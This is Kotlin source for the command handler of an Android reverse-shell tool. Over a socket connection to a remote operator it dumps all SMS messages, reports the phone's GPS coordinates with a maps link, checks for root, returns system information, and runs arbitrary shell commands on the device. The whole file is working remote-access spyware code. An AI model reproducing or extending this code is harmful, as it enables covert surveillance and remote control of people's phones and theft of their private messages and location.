package com.ironclad.saksham.reverse_shell

import android.content.Context
import android.location.Geocoder
import android.os.Build
import androidx.annotation.RequiresApi
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.OutputStream
import java.net.Socket
import java.util.Locale

object CommandHandler {

    fun handleSysInfo(socketOutput: OutputStream, shellOutput: OutputStream) {
        socketOutput.write((getSystemInfo() + "\n").toByteArray())
        socketOutput.flush()
        shellOutput.write(("\n").toByteArray()) //Shows an empty shell interface again after executing custom command
    }

    fun handleCheckRoot(socketOutput: OutputStream, shellOutput: OutputStream) {
        socketOutput.write((checkRoot() + "\n").toByteArray())
        socketOutput.flush()
        shellOutput.write(("\n").toByteArray())
    }

    fun handleHelp(socketOutput: OutputStream, shellOutput: OutputStream) {
        socketOutput.write((help() + "\n").toByteArray())
        socketOutput.flush()
        shellOutput.write(("\n").toByteArray())
    }

    fun handleExit(socket: Socket, process: Process) {
        socket.close()
        process.destroy()
    }

    fun handleGetSms(socketOutput: OutputStream, context: Context, shellOutput: OutputStream) {
        try {
            socketOutput.write(("Dumping all messages...\n").toByteArray())
            socketOutput.write((getSms(context) + "\n").toByteArray())
            socketOutput.flush()
            shellOutput.write(("\n").toByteArray())
        }
        catch (e:Exception){
            socketOutput.write((e.message + "\n").toByteArray())
            socketOutput.flush()
            shellOutput.write(("\n").toByteArray())
        }

        socketOutput.flush()
        shellOutput.write(("\n").toByteArray())
    }

    fun handleShellCommand(command: String, shellOutput: OutputStream, socketOutput: OutputStream) {
        if(command.isEmpty()){
            val message = "Error: please enter a shell command or type 'help' to get a list of commands"
            socketOutput.write((message + "\n").toByteArray())
            shellOutput.write(("\n").toByteArray())
        }
        else {
            shellOutput.write((command + "\n").toByteArray())
            shellOutput.flush()
        }
    }


    @RequiresApi(Build.VERSION_CODES.P)
    suspend fun handleCurrentLocation(context: Context, socketOutput: OutputStream, shellOutput: OutputStream)= withContext(Dispatchers.IO){
        try {
            val latitude = getCurrentLocation(context).latitude
            val longitude = getCurrentLocation(context).longitude
            val link = "https://www.google.com/maps?q=$latitude,$longitude"

            socketOutput.write(("Latitude: $latitude\nLongitude: $longitude\nMaps: $link\n").toByteArray())
            socketOutput.flush()
            shellOutput.write(("\n").toByteArray())
        }
        catch (e:Exception){
            socketOutput.write(("Error: ${e.message}\n").toByteArray())
            socketOutput.flush()
            shellOutput.write(("\n").toByteArray())
        }
    }

//    fun handleWriteToFile(socketOutput: OutputStream, context: Context, shellOutput: OutputStream){
//        try{
//            socketOutput.write((writeFile(context, "bogo1.txt", "This is a test") + "\n").toByteArray())
//            socketOutput.flush()
//            shellOutput.write(("\n").toByteArray())
//        }
//        catch (e:Exception){
//            socketOutput.write(("Error: ${e.message}\n").toByteArray())
//            socketOutput.flush()
//            shellOutput.write(("\n").toByteArray())
//        }
//    }
}

